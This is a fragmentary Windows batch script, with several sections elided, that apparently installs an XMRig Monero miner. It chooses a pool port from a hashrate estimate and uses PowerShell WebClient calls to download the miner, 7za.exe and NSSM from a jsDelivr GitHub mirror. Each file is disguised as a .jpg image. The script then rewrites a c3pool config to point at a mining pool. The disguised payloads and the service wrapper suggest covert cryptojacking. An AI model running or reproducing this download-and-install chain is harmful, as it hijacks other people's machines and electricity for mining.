...
if %EXP_MONERO_HASHRATE% gtr 208400  ( set PORT=7777 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 102400  ( set PORT=7777 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 51200  ( set PORT=5555 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 25600  ( set PORT=5555 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 12800  ( set PORT=5555 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 6400  ( set PORT=5555 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 3200  ( set PORT=5555 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 1600  ( set PORT=5555 & goto PORT_OK )
...
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://cdn.jsdelivr.net/gh/1753174725/xmrig@latest/xmrigdefault.jpg', '%USERPROFILE%\xmrig.zip')"
if errorlevel 1 (
...
if errorlevel 1 (
  ...
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://cdn.jsdelivr.net/gh/1753174725/xmrig@latest/7za.jpg', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
...
powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"sg.pool.xmrig.us:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
...
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://cdn.jsdelivr.net/gh/1753174725/xmrig@latest/nssm.jpg', '%USERPROFILE%\nssm.zip')"
if errorlevel 1 (
